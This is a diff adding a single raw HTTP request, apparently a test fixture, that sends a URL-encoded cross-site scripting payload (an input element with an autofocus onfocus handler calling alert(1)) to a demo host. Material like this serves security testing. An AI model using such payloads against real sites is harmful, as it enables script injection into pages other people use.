@@ -1,0 +1,4 @@
+GET /a?data=<input%20autofocus%20onfocus%3Dalert(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
